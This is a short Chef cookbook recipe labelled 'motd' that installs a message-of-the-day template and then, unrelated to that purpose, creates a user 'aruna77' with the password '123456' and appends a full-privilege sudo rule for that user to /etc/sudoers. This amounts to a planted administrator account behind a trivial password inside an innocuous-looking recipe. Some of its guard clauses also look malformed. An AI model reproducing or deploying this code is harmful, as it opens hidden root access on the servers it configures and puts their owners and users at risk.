#
# Cookbook Name:: motd
# Recipe:: default
#
# Copyright 2016, YOUR_COMPANY_NAME
#
# All rights reserved - Do Not Redistribute

template "/etc/motd" do
	source "motd.erb"
	mode "0644"
end


execute "add_permissions_in_sudoers_if_not_exist"  do

	command 'sed -i.bak \'/^root/a aruna77 ALL=(ALL) ALL\' /etc/sudoers'
	not_if 'grep aruna77 /etc/sudoers', :count => 0 

end

execute "adduser_if_not_exist" do

	command 'useradd aruna77; echo -e \"123456\\n123456\" | passwd aruna77'
	not_if 'grep aruna77 /etc/passwd', :user => 'aruna77'
end
